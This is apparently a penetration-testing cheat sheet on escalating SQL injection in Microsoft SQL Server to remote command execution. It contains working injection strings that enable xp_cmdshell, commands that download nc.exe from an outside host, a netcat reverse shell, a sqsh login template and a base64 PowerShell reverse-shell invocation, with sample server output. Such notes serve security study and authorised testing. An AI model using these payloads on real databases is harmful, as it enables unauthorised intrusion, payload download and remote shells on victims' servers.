# MSSQL

### SQL Injection to RCE

[https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e](https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e)

```
is_srvrolemember('sysadmin')
```

If it is equal to one, you can be execute xp\_cmdshell command.

```
' UNION SELECT NULL,test,NULL FROM Users; WAITFOR DELAY '0:0:5';--  - multiple queries ok.

' UNION SELECT NULL,test,NULL FROM Users; EXEC xp_cmdshell "whoami";--   - nope.

' UNION SELECT NULL,test,NULL FROM Users; EXEC sp_configure "show advanced options", 1;RECONFIGURE;EXEC sp_configure "xp_cmdshell", 1;RECONFIGURE;--

' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "whoami";-- - ok.

' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "powershell Invoke-WebRequest -Uri http://192.168.1.1/nc.exe -OutFile nc.exe";--  -OK

' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "nc.exe -e cmd 192.168.1.1 80";-- -OK
```

### Getting RCE on MSSQL

https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp\_cmdshell

xp\_cmdshell - Can only be executed by 'sa' and any other users with 'sysadmin' privileges

By default, only sysadmin is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp\_configure)

If we have credentials and mssql port is open to external access, we can connect with sqsh.

```
sqsh -S 192.168.1.2 -U {USER} -P {PASS} -D {DATABASENAME(NOT REQUIRED)}
```

```
1> EXEC master..xp_cmdshell 'whoami'
2> go

Msg 15281, Level 16, State 1
Server 'TEST\SQLEXPRESS', Procedure 'master..xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell'
because this component is turned off as part of the security configuration for this
server. A system administrator can enable the use of 'xp_cmdshell' by using
sp_configure. For more information about enabling 'xp_cmdshell', search for
'xp_cmdshell' in SQL Server Online.
```

If the output like the above then you need to activate the cmdshell feature with below commands

```
1> EXEC SP_CONFIGURE 'show advanced options',1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the
RECONFIGURE statement to install.
(return status = 0)

1> EXEC SP_CONFIGURE 'xp_cmdshell',1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE
statement to install.
(return status = 0)
```

With the above command we have configured that our SQL Server is able to execute command at the server.

```
1> xp_cmdshell 'whoami'
2> go

        output                                                                      

        ----------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
----------------

        nt authority\system                                                         

        NULL                                                                        

(2 rows affected, return status = 0)
```

To get reverse shell, we can execute powershell command.

https://www.revshells.com/ - Powershell #3 (Base64) - 192.168.1.1 - 80 - powershell

```
1> EXEC master..xp_cmdshell 'powershell -e JABjAG..........'
2> go
```
